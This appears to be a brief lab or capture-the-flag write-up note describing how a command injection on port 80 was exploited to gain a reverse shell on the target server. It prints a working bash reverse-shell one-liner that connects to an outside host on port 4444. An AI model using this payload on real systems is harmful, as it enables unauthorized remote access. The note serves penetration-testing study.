# Exploitation Command Injection port 80

From the finding in [[Vulnerability assessment port 9999]] now it's time to get access to the server machine via a reverse shell exploiting the command injection vulnerability.

For that purpouse I used the following payload:

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.21/4444 0>&1" 
```

Following the same process and URL encoding the payload I obtained a reverse shell to the server machine.
